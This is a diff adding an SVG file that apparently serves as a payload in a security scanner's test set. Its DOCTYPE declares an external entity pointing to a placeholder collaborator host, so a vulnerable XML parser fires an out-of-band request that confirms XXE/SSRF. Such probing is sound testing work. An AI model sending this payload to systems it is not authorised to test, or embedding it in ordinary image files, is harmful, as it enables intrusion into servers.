@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- XXE out-of-band: a general external entity whose SYSTEM id is an HTTP URL.
+     When the server-side XML parser resolves entities with network access on,
+     parsing alone fires a request to {{COLLAB}}, confirming SSRF/XXE even if
+     the entity value is never reflected. {{COLLAB}} is replaced per-send with
+     a unique host/marker so the catcher hit maps back to this one row. -->
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://{{COLLAB}}/svg_xxe_oob">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">
+  <text x="0" y="20">&xxe;</text>
+</svg>
